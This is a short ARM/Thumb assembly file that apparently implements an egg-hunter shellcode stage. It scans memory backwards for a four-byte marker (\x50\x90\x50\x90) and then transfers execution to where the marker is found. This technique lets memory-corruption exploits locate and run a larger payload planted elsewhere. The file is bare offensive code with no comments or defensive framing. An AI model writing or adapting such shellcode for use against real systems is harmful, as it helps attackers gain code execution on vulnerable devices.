.section .text
.global _start
_start:
	.ARM
	ADD R3, PC, #1
	BX R3

	.THUMB
	ADR R1, pmV
	LDR R2, egg

	dec_addr:
	SUB R1, R1, #1
	LDR R3, [R1]
	CMP R2, R3
	BNE dec_addr

	pmV:
	MOV R3, PC
	BX R3

	.ARM
	MOV PC, R1



egg:
	.ascii "\x50\x90\x50\x90"
